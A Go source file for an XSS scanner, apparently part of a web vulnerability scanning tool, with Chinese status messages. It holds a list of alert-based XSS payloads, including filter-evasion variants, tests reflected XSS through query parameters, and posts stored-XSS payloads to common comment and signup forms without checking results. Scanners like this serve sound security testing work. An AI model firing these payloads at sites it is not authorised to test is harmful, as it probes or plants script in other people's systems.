package scan

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type XSSScanner struct {
	target     string
	results    []XSSResult
	httpClient *http.Client
}

type XSSResult struct {
	URL         string
	Parameter   string
	Type        string
	Payload     string
	Evidence    string
	Severity    string
	Confirmed   bool
}

func NewXSSScanner(target string) *XSSScanner {
	return &XSSScanner{
		target:  target,
		results: []XSSResult{},
		httpClient: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

func (xs *XSSScanner) Scan() ([]XSSResult, error) {
	fmt.Println("🔍 开始XSS检测...")

	xs.testReflectedXSS()
	xs.testStoredXSS()

	fmt.Printf("✅ XSS检测完成，发现 %d 个漏洞\n", len(xs.results))
	return xs.results, nil
}

func (xs *XSSScanner) testReflectedXSS() {
	xssPayloads := []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"<body onload=alert('XSS')>",
		"<iframe src=javascript:alert('XSS')>",
		"<input onfocus=alert('XSS') autofocus>",
		"<select onfocus=alert('XSS') autofocus>",
		"<textarea onfocus=alert('XSS') autofocus>",
		"<keygen onfocus=alert('XSS') autofocus>",
		"<video><source onerror=alert('XSS')>",
		"<audio src=x onerror=alert('XSS')>",
		"<marquee onstart=alert('XSS')>",
		"<meter onmouseover=alert('XSS')>",
		"<details ontoggle=alert('XSS')>",
		"<object data=javascript:alert('XSS')>",
		"<embed src=javascript:alert('XSS')>",
		"<form><button formaction=javascript:alert('XSS')>",
		"<math><mtext><table><mglyph><style><img src=x onerror=alert('XSS')>",
		"javascript:alert('XSS')",
		"<a href=javascript:alert('XSS')>click</a>",
		"<sc<script>ript>alert('XSS')</sc</script>ript>",
		"<img src=\"x onerror=alert('XSS')\">",
		"<svg><script>alert('XSS')</script>",
	}

	parsedURL, err := url.Parse(xs.target)
	if err != nil {
		return
	}

	query := parsedURL.Query()
	for param := range query {
		for _, payload := range xssPayloads {
			testURL := xs.target
			if strings.Contains(testURL, "?") {
				testURL = strings.Replace(testURL, param+"="+query.Get(param), param+"="+url.QueryEscape(payload), 1)
			}

			resp, err := xs.httpClient.Get(testURL)
			if err != nil {
				continue
			}

			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			bodyStr := string(body)
			if strings.Contains(bodyStr, payload) || strings.Contains(bodyStr, url.QueryEscape(payload)) {
				result := XSSResult{
					URL:       testURL,
					Parameter: param,
					Type:      "Reflected XSS",
					Payload:   payload,
					Evidence:  "Payload reflected in response",
					Severity:  "High",
					Confirmed: false,
				}
				xs.results = append(xs.results, result)
				fmt.Printf("⚠️  发现XSS: %s (参数: %s)\n", testURL, param)
				return
			}
		}
	}
}

func (xs *XSSScanner) testStoredXSS() {
	storedPayloads := []string{
		"<script>alert('StoredXSS')</script>",
		"<img src=x onerror=alert('StoredXSS')>",
		"<svg onload=alert('StoredXSS')>",
	}

	commonForms := []string{
		"/search",
		"/comment",
		"/feedback",
		"/contact",
		"/register",
		"/signup",
		"/post",
		"/reply",
	}

	parsedURL, err := url.Parse(xs.target)
	if err != nil {
		return
	}

	baseURL := parsedURL.Scheme + "://" + parsedURL.Host

	for _, form := range commonForms {
		for _, payload := range storedPayloads {
			testURL := baseURL + form
			resp, err := xs.httpClient.PostForm(testURL, url.Values{
				"q":      {payload},
				"search": {payload},
				"name":   {payload},
				"email":  {payload},
				"message":{payload},
			})
			if err != nil {
				continue
			}
			resp.Body.Close()
		}
	}
}

func (xs *XSSScanner) GetResults() []XSSResult {
	return xs.results
}
